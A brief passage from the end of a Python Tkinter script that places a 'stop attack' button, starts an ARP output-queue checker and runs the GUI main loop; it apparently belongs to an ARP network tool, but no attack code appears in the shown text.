    )
    button_stop_attack.place(x=150, y=850, width=100, height=30)

    # start the process to check the queue
    process_arp_output_queue()

    root.mainloop()
